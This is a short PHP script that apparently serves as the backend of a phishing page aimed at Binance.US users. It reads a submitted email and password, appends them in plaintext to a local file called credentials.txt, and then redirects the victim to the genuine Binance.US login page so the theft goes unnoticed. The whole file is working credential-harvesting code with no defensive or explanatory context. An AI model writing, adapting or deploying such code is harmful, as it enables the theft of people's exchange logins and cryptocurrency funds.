<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    file_put_contents("credentials.txt", "Email: $email | Password: $password\n", FILE_APPEND);

    header("Location: https://www.binance.us/login");
    exit();
}
?>